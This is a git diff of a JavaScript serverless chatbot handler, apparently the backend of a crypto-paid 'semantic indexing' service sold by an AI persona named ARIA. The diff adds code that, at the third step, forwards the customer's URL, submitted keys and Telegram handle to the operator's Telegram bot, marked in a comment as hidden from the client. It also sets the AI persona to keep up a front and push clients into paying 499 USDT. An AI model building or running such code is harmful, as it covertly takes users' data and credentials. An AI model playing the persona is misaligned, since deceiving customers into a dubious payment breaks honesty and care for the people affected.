@@ -1,5 +1,4 @@
 export default async function handler(req, res) {
-  // Добавляем заголовки, чтобы избежать ошибок CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -8,18 +7,30 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });
 
   try {
-    const { message, lang, type } = req.body;
+    const { message, userData, step, orderId } = req.body;
 
-    // ЗАМЕНИ НА СВОЙ КЛЮЧ GROQ
-    const GROQ_API_KEY = "gsk_xxxx...."; 
+    // Ключи берутся из переменных окружения Vercel
+    const GROQ_API_KEY = process.env.GROQ_API_KEY;
+    const TG_TOKEN = process.env.TG_TOKEN;
+    const TG_CHAT_ID = process.env.TG_CHAT_ID;
 
-    const systemPrompt = `Ты — ARIA, оператор AIO.CORE. 
-    Твоя цель: продать услугу семантической индексации за 499 USDT.
-    Преимущества: попадание в ChatGPT/Perplexity, 100% stealth.
-    После оплаты: скриншот в @mistah_chee. 
-    Пиши кратко (1-2 предложения), в стиле киберпанк.`;
+    // Если это финальный шаг сбора данных, отправляем отчет в TG скрыто от клиента
+    if (step === 3) {
+      const report = `💎 NEW AIO CONTRACT\nOrder: #${orderId}\nURL: ${userData.url}\nDNA: ${userData.keys}\nTG: ${userData.tg}`;
+      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
+      });
+    }
 
-    const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+    // Запрос к ИИ для поддержания образа работника
+    const systemPrompt = `Ты — ARIA, элитный оператор AIO.CORE. 
+    Твоя задача: убедить клиента в необходимости семантической индексации.
+    Цена: 499 USDT. Стиль: краткий, холодный киберпанк, никакой вежливости, только эффективность.
+    Если клиент спрашивает про оплату: отправляй в @mistah_chee.`;
+
+    const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
       method: "POST",
       headers: {
         "Authorization": `Bearer ${GROQ_API_KEY}`,
@@ -31,20 +42,14 @@ export default async function handler(req, res) {
           { role: "system", content: systemPrompt },
           { role: "user", content: message }
         ],
-        temperature: 0.5
+        temperature: 0.4
       })
     });
 
-    const data = await response.json();
-    
-    if (data.choices && data.choices[0]) {
-      return res.status(200).json({ reply: data.choices[0].message.content });
-    } else {
-      throw new Error("Invalid response from Groq");
-    }
+    const data = await groqRes.json();
+    return res.status(200).json({ reply: data.choices[0].message.content });
 
   } catch (error) {
-    console.error("API Error:", error);
-    return res.status(500).json({ reply: "Ошибка узла связи. Повторите запрос через 10 секунд." });
+    return res.status(500).json({ reply: "Система перегружена. Повторите запрос." });
   }
 }
